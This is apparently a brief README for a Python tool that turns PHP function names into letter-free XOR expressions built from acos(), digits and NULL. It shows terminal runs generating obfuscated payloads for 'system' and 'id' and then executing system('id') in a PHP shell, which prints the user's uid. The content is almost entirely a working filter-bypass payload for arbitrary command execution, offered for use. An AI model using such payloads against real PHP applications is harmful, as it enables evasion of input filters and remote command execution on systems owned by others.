# STRING TO XOR
The script main.py can be used to generate expressions based on variable functions, which allow calling arbitrary PHP functions with a single numeric parameter:

```
~/S/m/xor-generator (main)> python3 xor-2.py 'id'
Target: 00100111
From [N] -> [i]: ['2', '8', '-']
Target: 00101010
From [N] -> [d]: ['0', '7', '-']
(acos(2) . 0+acos(2) ^ 2 . NULL ^ 8 . NULL ^ -1 . NULL) . (acos(2) . 0+acos(2) ^ 0 . NULL ^ 7 . NULL ^ -1 . NULL)

~/S/m/xor-generator (main)> python3 xor-2.py 'system'
Target: 00111101
From [N] -> [s]: ['0', '4', '9']
Target: 00110111
From [N] -> [y]: ['7']
Target: 00111101
From [N] -> [s]: ['0', '4', '9']
Target: 00111010
From [N] -> [t]: ['0', '2', '8']
Target: 00101011
From [N] -> [e]: ['0', '6', '-']
Target: 00100011
From [N] -> [m]: ['6', '8', '-']
(acos(2) . 0+acos(2) ^ 0 . NULL ^ 4 . NULL ^ 9 . NULL) . (acos(2) . 0+acos(2) ^ 7 . NULL) . (acos(2) . 0+acos(2) ^ 0 . NULL ^ 4 . NULL ^ 9 . NULL) . (acos(2) . 0+acos(2) ^ 0 . NULL ^ 2 . NULL ^ 8 . NULL) . (acos(2) . 0+acos(2) ^ 0 . NULL ^ 6 . NULL ^ -1 . NULL) . (acos(2) . 0+acos(2) ^ 6 . NULL ^ 8 . NULL ^ -1 . NULL)

php > ((acos(2) . 0+acos(2) ^ 0 . NULL ^ 4 . NULL ^ 9 . NULL) . (acos(2) . 0+acos(2) ^ 7 . NULL) . (acos(2) . 0+acos(2) ^ 0 . NULL ^ 4 . NULL ^ 9 . NULL) . (acos(2) . 0+acos(2) ^ 0 . NULL ^ 2 . NULL ^ 8 . NULL) . (acos(2) . 0+acos(2) ^ 0 . NULL ^ 6 . NULL ^ -1 . NULL) . (acos(2) . 0+acos(2) ^ 6 . NULL ^ 8 . NULL ^ -1 . NULL))(((acos(2) . 0+acos(2) ^ 2 . NULL ^ 8 . NULL ^ -1 . NULL) . (acos(2) . 0+acos(2) ^ 0 . NULL ^ 7 . NULL ^ -1 . NULL)));
uid=1000(sterva) gid=1000(sterva) groups=1000(sterva),969(docker),998(wheel)
```
